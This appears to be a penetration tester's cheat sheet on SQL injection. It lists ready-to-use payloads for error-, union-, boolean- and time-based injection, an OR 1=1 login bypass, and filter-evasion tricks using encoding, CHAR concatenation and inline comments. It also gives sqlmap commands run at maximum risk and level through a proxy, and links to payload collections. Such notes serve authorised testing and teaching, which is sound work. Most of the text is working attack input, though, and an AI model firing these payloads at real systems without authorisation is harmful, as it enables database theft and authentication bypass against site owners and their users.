# SQL Injection

* **Pre-checks**
  * Check for char blacklists - `' " ; --`
  * Parameterized query
  * Upload encoded payload
    * URL, Base64
  * Blind SQLi
  * Run sqlmap
* Check for below payloads in path parameter, header, POST/PUT Request body
  * ``' " ` ') ") `) ')) ")) `)) %BF %ff %00 ">< 🅐``
  * Unicode char converter -> [https://qaz.wtf/u/convert.cgi?text=a](https://qaz.wtf/u/convert.cgi?text=a)
  * List instead of Integer -> \[]
    * website?id=\[1,2]
    * website?id\[]=1
* **In-Band SQLi**
  * In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results
  * **Error-Based SQL Injection**
  * Try
    * `' '-- ';-- " "-- ";--`
  * **Union-Based SQL Injection**
  * Try
    * `1 UNION SELECT 1`
    * `1 UNION SELECT 1,2 and so on`
  * **Blind SQLi - Authentication Bypass**
    * Bypass login forms
    * `select * from users where username='' and password='' OR 1=1;`
  * **Blind SQLi - Boolean Based**
    * Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes.
  * **Blind SQLi - Time Based**
    * `admin123' UNION SELECT SLEEP(5);--`
* **Out-of-Band SQLi**
  * Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.
    * An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.
    * The Website makes an SQL query to the database which also passes the hacker's payload.
    * The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.
* Tricks
  * URL Encode the payload
  * Bypass blocked characters
    * `SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)|| CHR(114)||CHR(99)||CHR(117)||CHR(115)`
    * `SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97) +CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)`
  * If Comment is blocked
    * `' or 'a'='a`
  * &#x20;Circumvent simple validation
    * `SeLeCt`&#x20;
    * `%00SELECT`&#x20;
    * `SELSELECTECT`&#x20;
    * `%53%45%4c%45%43%54`&#x20;
    * `%2553%2545%254c%2545%2543%2554`
  * Using comments to bypass filters
    * `SELECT/*foo`_`*`_`/username,password/*foo`_`*`_`/FROM/*foo*/users`
    * `SEL/*foo*/ECT username,password FR/*foo*/OM users`
  * Second order SQLi
    * Save a payload in db with **`'`** at end
    * When it is used in other Query, the incomplete **`'`** can be used to inject SQL
* **Tools**
  * SQLMap

```python
python sqlmap.py -u http://url.com?employee=1234 -p employee
```

```bash
python sqlmap.py -r request.txt --risk=3 --level=5 --batch
```

Forward SQLMap requests to BeEF Proxy

```
python sqlmap.py -u http://url.com?employee=1234 -p employee --proxy='http://127.0.0.1:8080' --randomize rnd --dbms=mysql --technique=U --union-cols=7-10 --prefix="'" --suffix=" # " --banner
```



* [https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
* Payloads
  * [https://github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)
  * [https://pentestbook.six2dez.com/enumeration/web/sqli](https://pentestbook.six2dez.com/enumeration/web/sqli)
  * [https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
  * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
  * [https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)
